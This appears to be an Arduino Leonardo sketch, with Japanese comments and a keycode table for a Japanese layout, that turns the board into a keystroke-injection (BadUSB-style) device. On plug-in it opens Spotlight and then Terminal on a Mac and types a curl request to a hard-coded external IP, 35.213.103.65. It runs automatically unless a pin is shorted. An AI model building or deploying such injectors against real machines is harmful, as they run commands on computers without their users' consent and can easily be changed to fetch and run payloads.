#include "Keyboard.h"
#define pin3 3

//キーボード操作の簡略化関数
// 例：funk(KEY_TAB); や funk(KEY_RETURN); 
void func(int key) {
  Keyboard.press(key);
  delay(100);
  Keyboard.releaseAll();
  delay(200);
}

void test() {
    delay(2000);
    Keyboard.press(KEY_LEFT_GUI); //cmd
    Keyboard.press(0x20); //spaceTermi
    Keyboard.releaseAll();

    delay(1000);
    Keyboard.print("Terminal.app");
    Keyboard.releaseAll();
    delay(1000);
    Keyboard.press(KEY_RETURN);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(2000);
    Keyboard.print("curl http://35.213.103.65:80/scripts/testuser");
    delay(1000);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
}

void setup() {
  Keyboard.begin();
  //pin3のショートでOFF。書き込みモード。
  pinMode(pin3, INPUT_PULLUP);
  delay(3000);
  if(digitalRead(pin3) == HIGH){

      test();

  }
}

void loop() {
  //何も入れない。自然由来の美味しさ。
  // put your main code here, to run repeatedly:
  
}

//参考文献
//https://qiita.com/MergeCells/items/17bdc1c1fb35949195b5
//Leonardで書き込み
//Port認識されない際は、RTSとGNDを2回ショートさせる。

    //調査済みキーマップ
    //Keyboard.write(0x20);space
    //Keyboard.write(0x21);!
    //Keyboard.write(0x22);→*
    //Keyboard.write(0x23);#
    //Keyboard.write(0x24);$
    //Keyboard.write(0x25);%
    //Keyboard.write(0x26);'
    //Keyboard.write(0x27);:
    //Keyboard.write(0x28);)
    //Keyboard.write(0x29);0
    
    //Keyboard.write(0x30);0
    //Keyboard.write(0x31);1
    //Keyboard.write(0x32);2
    //Keyboard.write(0x33);3
    //Keyboard.write(0x34);4
    //Keyboard.write(0x35);5
    //Keyboard.write(0x36);6
    //Keyboard.write(0x37);7
    //Keyboard.write(0x38);8
    //Keyboard.write(0x39);9
    //Keyboard.write(0x3a);+
    //Keyboard.write(0x3b);;
    //Keyboard.write(0x3c);<
    //Keyboard.write(0x3d);^
    //Keyboard.write(0x3f);?
    //Keyboard.write(0x40);→"
    //Keyboard.write(0x41);A
    //Keyboard.write(0x42);B
    //Keyboard.write(0x43);C
    //Keyboard.write(0x44);D
    //Keyboard.write(0x45);E
    //Keyboard.write(0x46);F
    //Keyboard.write(0x47);G
    //Keyboard.write(0x48);H
    //Keyboard.write(0x49);I
    
    //Keyboard.write(0x50);P
    //Keyboard.write(0x51);Q
    //Keyboard.write(0x52);R
    //Keyboard.write(0x53);S
    //Keyboard.write(0x54);T
    //Keyboard.write(0x55);U
    //Keyboard.write(0x56);V
    //Keyboard.write(0x57);W
    //Keyboard.write(0x58);X
    //Keyboard.write(0x59);
    //Keyboard.write(0x5a);Z
    //Keyboard.write(0x5b);@
    //Keyboard.write(0x5c);]
    //Keyboard.write(0x5d);[
    //Keyboard.write(0x5e);&
    //Keyboard.write(0x5f);=   
    //Keyboard.write(0x60);Y
    //Keyboard.write(0x61);a
    //Keyboard.write(0x62);b
    //Keyboard.write(0x63);c
    //Keyboard.write(0x64);d
    //Keyboard.write(0x65);e
    //Keyboard.write(0x66);f
    //Keyboard.write(0x67);g
    //Keyboard.write(0x68);h
    //Keyboard.write(0x69);i
    //Keyboard.write(0x6a);j
    //Keyboard.write(0x6b);k
    //Keyboard.write(0x6c);l
    //Keyboard.write(0x6d);m
    //Keyboard.write(0x6e);n
    //Keyboard.write(0x6f);o   
    //Keyboard.write(0x71);q
    //Keyboard.write(0x72);r
    //Keyboard.write(0x73);s
    //Keyboard.write(0x74);t
    //Keyboard.write(0x75);u
    //Keyboard.write(0x76);v
    //Keyboard.write(0x77);w
    //Keyboard.write(0x78);x
    //Keyboard.write(0x79);y
    //Keyboard.write(0x7a);z
    //Keyboard.write(0x7b);`
    //Keyboard.write(0x7c);}
    //Keyboard.write(0x7d);{
